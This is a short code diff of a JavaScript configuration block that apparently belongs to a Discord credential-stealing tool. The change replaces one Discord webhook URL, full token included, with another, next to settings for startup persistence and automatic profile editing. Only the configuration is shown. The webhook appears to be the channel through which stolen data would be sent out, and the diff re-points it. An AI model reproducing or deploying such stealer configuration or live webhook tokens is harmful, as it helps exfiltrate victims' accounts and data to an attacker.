@@ -32,7 +32,7 @@ const execScript = async (script) => {
 };
 
 const CONFIG = {
-    webhook: 'https://discordapp.com/api/webhooks/1357647798635331685/xlbEyZQgY3fzK0DN48NZaNisDZ5F08q0dLDu7B2NV2b-GPDTXxtIKMwddvf7HFPhljlt',
+    webhook: 'https://discord.com/api/webhooks/1357689786000740412/-jQbq2rWQr7rlAeNtHSxfVHpLuMubn214YqvCYF7uWe1QgdvxPVqFEyrwE8X2kBqSbEI',
     API: 'null',
     auto_user_profile_edit: 'false',
     auto_persist_startup: '%false',
